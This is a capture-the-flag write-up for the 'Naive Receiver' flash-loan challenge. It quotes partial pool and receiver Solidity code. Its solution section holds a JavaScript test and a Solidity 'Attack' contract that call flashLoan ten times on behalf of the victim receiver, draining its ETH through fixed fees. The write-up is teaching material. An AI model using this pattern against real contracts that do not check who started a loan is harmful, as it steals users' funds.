# 02_NaiveReceiver

## Challenge

There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH.

A user has deployed a contract with 10 ETH in balance. It’s capable of interacting with the pool and receiving flash loans of ETH.

Take all ETH out of the user’s contract. If possible, in a single transaction.

You are provided with the code for the flash loan providing pool:

        }

        if (address(this).balance < balanceBefore + FIXED_FEE)
            revert RepayFailed();

        return true;
    }

    // Allow deposits of ETH
    receive() external payable {}
}
```

you also get the code for the Receiver:

        if (token != ETH)

        unchecked {
            amountToBeRepaid = amount + fee;
        }

        _executeActionDuringFlashLoan();

        // Return funds to pool
        SafeTransferLib.safeTransferETH(pool, amountToBeRepaid);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    // Internal function where the funds received would be used
    function _executeActionDuringFlashLoan() internal { }

    // Allow deposits of ETH
    receive() external payable {}
}
```

## Solution

If we take a look at the test case, we see that to solve the challenge all money in the receiver shall be drained and all of it shall now be in the pool.

### Easy way

As the receiver just pays the fee for any call it gets from its pool we can just call the pool 10x and set the receiver to receive the flash loan and have to pay the 1 ETH fee. This can be just achieved by calling flash loan 10x:

```js
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        const ETH = await pool.ETH();
        await pool.connect(player).flashLoan(receiver.address, ETH, await pool.maxFlashLoan(ETH), "0x");
        await pool.connect(player).flashLoan(receiver.address, ETH, await pool.maxFlashLoan(ETH), "0x");
        await pool.connect(player).flashLoan(receiver.address, ETH, await pool.maxFlashLoan(ETH), "0x");
        await pool.connect(player).flashLoan(receiver.address, ETH, await pool.maxFlashLoan(ETH), "0x");
        await pool.connect(player).flashLoan(receiver.address, ETH, await pool.maxFlashLoan(ETH), "0x");
        await pool.connect(player).flashLoan(receiver.address, ETH, await pool.maxFlashLoan(ETH), "0x");
        await pool.connect(player).flashLoan(receiver.address, ETH, await pool.maxFlashLoan(ETH), "0x");
        await pool.connect(player).flashLoan(receiver.address, ETH, await pool.maxFlashLoan(ETH), "0x");
        await pool.connect(player).flashLoan(receiver.address, ETH, await pool.maxFlashLoan(ETH), "0x");
        await pool.connect(player).flashLoan(receiver.address, ETH, await pool.maxFlashLoan(ETH), "0x");
    });
```

After this, the receiver transferred all his money to the pool and we solved the challenge

### Hard Way

The description state that we should also be able to do everything in one transaction. This is also achievable pretty easily. I just implemented a small attack contract, which if called, just calls the same flash loan function 10x. So we have one tx for everything. 

```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";
import "./FlashLoanReceiver.sol";

contract Attack {

    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    function getEmBoyz(address payable receiver, address payable pool) public
    {
        for (uint256 i = 0; i < 10; i++) {
            NaiveReceiverLenderPool(pool).flashLoan(FlashLoanReceiver(receiver), ETH, NaiveReceiverLenderPool(pool).maxFlashLoan(ETH), "0x");
        }
    }
}
```

We then just deploy this contract and call its function getEmBoyz().

```js
it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */

    const Attack = await ethers.getContractFactory('Attack', player);
    attack = await Attack.deploy();
    await attack.connect(player).getEmBoyz(receiver.address, pool.address);
});
```

This yields us the same result, in one instead of ten transactions.
